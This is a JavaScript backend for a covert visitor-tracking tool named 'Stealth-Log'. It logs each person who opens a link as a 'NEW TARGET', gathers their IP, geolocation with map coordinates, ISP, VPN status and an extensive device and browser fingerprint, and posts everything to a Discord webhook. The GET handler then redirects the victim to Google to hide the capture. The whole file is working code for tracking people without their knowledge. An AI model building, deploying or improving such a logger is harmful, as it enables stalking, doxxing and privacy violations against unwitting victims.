// ============================================
// 🕵️ STEALTH-LOG v3.0 — Backend API
// Works with Stoat.chat / Vercel
// ============================================

export default async function handler(req, res) {
  if (req.method === 'POST') {
    return handlePost(req, res);
  }
  return handleGet(req, res);
}

// ══════════════════════════════════════
// 📨 POST — Full Data from Frontend
// ══════════════════════════════════════
async function handlePost(req, res) {

  const ip = getIP(req);
  let c = {};
  try { c = req.body || {}; } catch(e) { c = {}; }

  // ── GEO Data (Primary) ──
  let geo = {};
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`
    );
    geo = await r.json();
  } catch(e) { geo = { status: "fail" }; }

  // ── GEO Data (Secondary) ──
  let geo2 = {};
  try {
    const r2 = await fetch(`https://ipinfo.io/${ip}/json`);
    geo2 = await r2.json();
  } catch(e) {}

  // ── Vercel Headers ──
  const vh = {
    city:    safe(req.headers['x-vercel-ip-city']),
    country: req.headers['x-vercel-ip-country'] || '??',
    region:  req.headers['x-vercel-ip-country-region'] || '??',
    lat:     req.headers['x-vercel-ip-latitude'] || null,
    lon:     req.headers['x-vercel-ip-longitude'] || null,
    tz:      req.headers['x-vercel-ip-timezone'] || '??',
  };

  // ── Map Link ──
  const lat = geo.lat || vh.lat;
  const lon = geo.lon || vh.lon;
  const mapLink = (lat && lon)
    ? `https://www.google.com/maps?q=${lat},${lon}`
    : 'N/A';

  // ── Security ──
  let sec = [];
  if (geo.proxy)   sec.push('🔴 VPN/PROXY');
  if (geo.hosting) sec.push('🟡 DATACENTER');
  if (geo.mobile)  sec.push('📶 MOBILE');
  if (!sec.length) sec.push('✅ CLEAN IP');
  const secStr = sec.join(' | ');

  // ── Headers ──
  const ua         = req.headers['user-agent'] || 'Unknown';
  const secChUa    = req.headers['sec-ch-ua'] || 'N/A';
  const secChPlat  = req.headers['sec-ch-ua-platform'] || 'N/A';
  const secChMob   = req.headers['sec-ch-ua-mobile'] || 'N/A';
  const acceptLang = req.headers['accept-language'] || 'N/A';

  // ── Time ──
  const now = new Date();
  const timeStr = now.toLocaleString('en-IN', {
    timeZone: geo.timezone || 'UTC',
    weekday: 'short', year: 'numeric', month: 'short',
    day: 'numeric', hour: '2-digit', minute: '2-digit',
    second: '2-digit', hour12: true
  });

  // ── Webhook ──
  const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
  if (!WEBHOOK) {
    console.error("⚠️ WEBHOOK MISSING");
    return res.status(200).json({ ok: true });
  }

  const cc = geo.countryCode ? geo.countryCode.toLowerCase() : 'un';

  // ════════════════════════════════════════
  // 📝 MESSAGE 1: Network + Location
  // ════════════════════════════════════════
  const msg1 = {
    username: "🕵️ Stealth-Log",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png",
    content: [
      `# 🚨 NEW TARGET — \`${ip}\``,
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      `📅 **${timeStr}** | 🆔 \`${c.requestId || 'N/A'}\``,
    ].join('\n'),
    embeds: [
      {
        title: "🌐 Network & Security",
        color: 0xFF0000,
        thumbnail: {
          url: `https://flagsapi.com/${geo.countryCode || 'US'}/flat/64.png`
        },
        description: [
          `\`\`\``,
          `╔══════════════════════════════════╗`,
          `║  🔢 IP:    ${ip}`,
          `║  🏢 ISP:   ${cut(geo.isp, 35)}`,
          `║  🏗️ Org:   ${cut(geo.org || geo2.org, 35)}`,
          `║  📡 AS:    ${cut(geo.as, 35)}`,
          `║  📶 Mobile: ${geo.mobile ? 'Yes' : 'No'}`,
          `╚══════════════════════════════════╝`,
          `\`\`\``,
          `**🛡️ Security:** ${secStr}`,
          geo.proxy ? `> ⚠️ **VPN/Proxy Detected! Real IP may be hidden**` : `> ✅ No VPN/Proxy`,
        ].join('\n'),
        timestamp: now.toISOString()
      },
      {
        title: `:flag_${cc}: Location Details`,
        color: 0x3B82F6,
        description: [
          `\`\`\``,
          `╔══════════════════════════════════╗`,
          `║  🌍 Country:  ${geo.country || '??'} (${geo.countryCode || '??'})`,
          `║  🏘️ Region:   ${geo.regionName || '??'}`,
          `║  🏙️ City:     ${geo.city || '??'}`,
          `║  📮 ZIP:      ${geo.zip || geo2.postal || '??'}`,
          `║  📐 Lat:      ${lat || '??'}`,
          `║  📐 Lon:      ${lon || '??'}`,
          `║  🕐 Timezone: ${geo.timezone || '??'}`,
          `╚══════════════════════════════════╝`,
          `\`\`\``,
          `🗺️ **[📍 Open in Google Maps](${mapLink})**`,
          ``,
          `> **Vercel Geo:** ${vh.city}, ${vh.country} (${vh.region})`,
        ].join('\n'),
        timestamp: now.toISOString()
      }
    ]
  };

  // ════════════════════════════════════════
  // 📝 MESSAGE 2: Device + Screen
  // ════════════════════════════════════════
  const msg2 = {
    username: "🕵️ Stealth-Log",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png",
    embeds: [{
      title: "📱 Device & Display",
      color: 0x10B981,
      description: [
        `\`\`\``,
        `╔══════ DEVICE ═══════════════════╗`,
        `║ 📱 Type:      ${c.deviceType || '??'}`,
        `║ 🖥️ OS:        ${c.parsedOS || '??'}`,
        `║ 🌐 Browser:   ${c.parsedBrowser || '??'}`,
        `║ 💻 Platform:  ${c.platform || '??'}`,
        `║ 🏭 Vendor:    ${c.vendor || '??'}`,
        `╠══════ HARDWARE ═══════════════════╣`,
        `║ ⚙️ CPU Cores:  ${c.hardwareConcurrency || '??'}`,
        `║ 💾 RAM:        ${c.deviceMemory || '??'}`,
        `║ 👆 Touch:      ${c.maxTouchPoints || '0'} points`,
        `║ 📷 Cameras:    ${c.cameras || '??'}`,
        `║ 🎤 Mics:       ${c.microphones || '??'}`,
        `║ 🔊 Speakers:   ${c.speakers || '??'}`,
        `╠══════ GPU ═══════════════════════╣`,
        `║ 🎮 Vendor:    ${cut(c.gpuVendor, 35)}`,
        `║ 🎮 Renderer:  ${cut(c.gpuRenderer, 35)}`,
        `║ 📐 MaxTex:    ${c.maxTextureSize || '??'}`,
        `║ 🎨 GL Ver:    ${cut(c.glVersion, 30)}`,
        `╠══════ SCREEN ═════════════════════╣`,
        `║ 📺 Resolution: ${c.screenWidth || '?'}×${c.screenHeight || '?'}`,
        `║ 📐 Available:  ${c.screenAvailWidth || '?'}×${c.screenAvailHeight || '?'}`,
        `║ 🪟 Window:     ${c.innerWidth || '?'}×${c.innerHeight || '?'}`,
        `║ 🔍 Pixel:      ${c.pixelRatio || '?'}x`,
        `║ 🎨 Depth:      ${c.colorDepth || '?'} bit`,
        `║ 📱 Orient:     ${cut(c.orientation, 25)}`,
        `║ 🌙 DarkMode:   ${c.darkMode || '??'}`,
        `╚══════════════════════════════════╝`,
        `\`\`\``,
      ].join('\n'),
      timestamp: now.toISOString()
    }]
  };

  // ════════════════════════════════════════
  // 📝 MESSAGE 3: Connection + Battery + Features
  // ════════════════════════════════════════
  const msg3 = {
    username: "🕵️ Stealth-Log",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png",
    embeds: [
      {
        title: "📶 Network & Power",
        color: 0xF59E0B,
        description: [
          `\`\`\``,
          `╔══════ CONNECTION ══════════════╗`,
          `║ 📡 Type:      ${c.connectionType || '??'}`,
          `║ ⬇️ Speed:     ${c.downlink || '??'}`,
          `║ ⏱️ Latency:   ${c.rtt || '??'}`,
          `║ 💰 DataSaver: ${c.saveData || '??'}`,
          `║ 🌐 Online:    ${c.onLine ? 'Yes ✅' : 'No ❌'}`,
          `╠══════ BATTERY ═════════════════╣`,
          `║ 🔋 Level:     ${c.batteryLevel || '??'}`,
          `║ ⚡ Charging:  ${c.batteryCharging || '??'}`,
          `║ ⏰ To Full:   ${c.chargingTime || '??'}`,
          `║ ⏰ To Empty:  ${c.dischargingTime || '??'}`,
          `╚══════════════════════════════════╝`,
          `\`\`\``,
        ].join('\n'),
        timestamp: now.toISOString()
      },
      {
        title: "🛠️ Browser Capabilities",
        color: 0x8B5CF6,
        description: [
          `\`\`\``,
          `╔══════ FEATURES ══════════════════╗`,
          `║ 🍪 Cookies:      ${c.cookiesEnabled ? '✅ Yes' : '❌ No'}`,
          `║ 🚫 DoNotTrack:   ${c.doNotTrack || 'unset'}`,
          `║ 🛡️ AdBlocker:    ${c.adBlocker || '??'}`,
          `║ 🎮 WebGL:        ${c.webGL ? '✅' : '❌'}`,
          `║ 📞 WebRTC:       ${c.webRTC ? '✅' : '❌'}`,
          `║ 💽 LocalStorage:  ${c.localStorage ? '✅' : '❌'}`,
          `║ 💽 IndexedDB:     ${c.indexedDB ? '✅' : '❌'}`,
          `║ ⚙️ ServiceWorker: ${c.serviceWorker ? '✅' : '❌'}`,
          `║ 🔧 WebAssembly:  ${c.webAssembly ? '✅' : '❌'}`,
          `║ 📳 Vibration:    ${c.vibration ? '✅' : '❌'}`,
          `║ 📋 Clipboard:    ${c.clipboard ? '✅' : '❌'}`,
          `║ 🗣️ Speech:       ${c.speechSynth ? '✅' : '❌'}`,
          `║ 🔔 Notification: ${c.notification || '??'}`,
          `║ 📖 PDF Viewer:   ${c.pdfViewerEnabled ? '✅' : '❌'}`,
          `║ 🎮 Gamepad:      ${c.gamepad ? '✅' : '❌'}`,
          `╚══════════════════════════════════╝`,
          `\`\`\``,
        ].join('\n'),
        timestamp: now.toISOString()
      }
    ]
  };

  // ════════════════════════════════════════
  // 📝 MESSAGE 4: Fingerprint + Identity
  // ════════════════════════════════════════
  const msg4 = {
    username: "🕵️ Stealth-Log",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png",
    embeds: [
      {
        title: "🔐 Fingerprint & Identity",
        color: 0xEC4899,
        description: [
          `\`\`\``,
          `╔══════ FINGERPRINT ═══════════════╗`,
          `║ 🖼️ Canvas:   ${c.canvasFingerprint || '??'}`,
          `║ 🔊 Audio SR: ${c.audioSampleRate || '??'}`,
          `║ 🔊 Channels: ${c.audioChannels || '??'}`,
          `║ 📊 Visits:   ${c.visitCount || '1'}`,
          `║ 📅 1st Visit: ${cut(c.firstVisit, 25)}`,
          `║ 📜 History:  ${c.historyLength || '??'}`,
          `║ 🔤 Fonts:    ${c.fontCount || '0'} detected`,
          `╠══════ LANGUAGES ═══════════════════╣`,
          `║ 🗣️ Primary:  ${c.language || '??'}`,
          `║ 🌍 All:      ${cut(c.languages, 40)}`,
          `╠══════ TIME ════════════════════════╣`,
          `║ 🕐 Zone:     ${c.timezone || '??'}`,
          `║ ⏰ Offset:   ${c.timezoneOffset || '??'} min`,
          `║ 📅 Local:    ${cut(c.localTime, 30)}`,
          `╠══════ MOTION ══════════════════════╣`,
          `║ 🌙 DarkMode: ${c.darkMode || '??'}`,
          `║ ♿ Reduced:  ${c.reducedMotion || '??'}`,
          `╚══════════════════════════════════╝`,
          `\`\`\``,
        ].join('\n'),
        timestamp: now.toISOString()
      },
      {
        title: "📋 Raw Data & Headers",
        color: 0x6366F1,
        description: [
          `**📱 User-Agent:**`,
          `\`\`\`${cut(ua, 500)}\`\`\``,
          `**🔧 Client Hints:**`,
          `\`\`\``,
          `CH-UA:       ${cut(secChUa, 80)}`,
          `Platform:    ${secChPlat}`,
          `Mobile:      ${secChMob}`,
          `Accept-Lang: ${cut(acceptLang, 60)}`,
          `\`\`\``,
          `**🔤 Detected Fonts:**`,
          `\`${cut(c.detectedFonts, 300)}\``,
          ``,
          `**🔗 Referrer:** \`${cut(c.referrer, 100)}\``,
          `**🔗 Page URL:** \`${cut(c.currentURL, 100)}\``,
          ``,
          `> ℹ️ **ipinfo.io:** ${geo2.city || '??'}, ${geo2.region || '??'}, ${geo2.country || '??'} | ${cut(geo2.org, 50)}`,
        ].join('\n'),
        footer: {
          text: `🕵️ Stealth-Log v3.0 | ${timeStr} | ${ip}`,
          icon_url: "https://cdn-icons-png.flaticon.com/512/6195/6195699.png"
        },
        timestamp: now.toISOString()
      }
    ]
  };

  // ═══════════════════════════════════
  // 📤 SEND ALL MESSAGES
  // ═══════════════════════════════════
  const allMsgs = [msg1, msg2, msg3, msg4];

  for (const msg of allMsgs) {
    try {
      const r = await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msg)
      });

      if (!r.ok) {
        const txt = await r.text();
        console.error(`Discord ${r.status}: ${txt}`);
      }

      // Rate limit se bachne ke liye delay
      await new Promise(r => setTimeout(r, 600));
    } catch(e) {
      console.error("Send Error:", e);
    }
  }

  return res.status(200).json({ ok: true });
}


// ══════════════════════════════════════
// 🔄 GET — Direct Link (Basic Capture)
// ══════════════════════════════════════
async function handleGet(req, res) {
  const ip = getIP(req);

  let geo = {};
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,mobile,proxy,hosting,timezone,query`
    );
    geo = await r.json();
  } catch(e) { geo = { status: "fail" }; }

  const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
  if (!WEBHOOK) return res.redirect(302, 'https://www.google.com');

  const mapLink = geo.status === "success"
    ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}`
    : 'N/A';

  const ua = req.headers['user-agent'] || 'Unknown';

  let sec = [];
  if (geo.proxy)   sec.push('🔴 VPN');
  if (geo.hosting) sec.push('🟡 DC');
  if (geo.mobile)  sec.push('📶 MOB');
  if (!sec.length) sec.push('✅ CLEAN');

  const payload = {
    username: "🕵️ Stealth-Log (Quick)",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/2991/2991148.png",
    embeds: [{
      title: "⚡ Quick Capture (GET)",
      color: 0xFF6B35,
      description: [
        `> ⚠️ *Send HTML page link for full capture*`,
        ``,
        `\`\`\``,
        `IP:       ${ip}`,
        `ISP:      ${geo.isp || '??'}`,
        `Location: ${geo.city || '??'}, ${geo.country || '??'}`,
        `Security: ${sec.join(' | ')}`,
        `\`\`\``,
        `🗺️ [Map](${mapLink})`,
        ``,
        `**UA:** \`${ua.substring(0, 300)}\``,
      ].join('\n'),
      footer: { text: "Use HTML page for full data" },
      timestamp: new Date().toISOString()
    }]
  };

  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch(e) {}

  res.redirect(302, 'https://www.google.com');
}


// ══════════════════════════════════════
// 🔧 HELPERS
// ══════════════════════════════════════
function getIP(req) {
  let ip = req.headers['x-forwarded-for']
    || req.headers['x-real-ip']
    || req.socket?.remoteAddress
    || 'unknown';
  if (Array.isArray(ip)) ip = ip[0];
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
  if (typeof ip === 'string' && ip.startsWith('::ffff:'))
    ip = ip.replace('::ffff:', '');
  return ip;
}

function cut(str, max = 200) {
  const s = String(str || 'Unknown');
  return s.length > max ? s.substring(0, max - 3) + '...' : s;
}

function safe(str) {
  if (!str) return '??';
  try { return decodeURIComponent(str); }
  catch(e) { return str; }
}
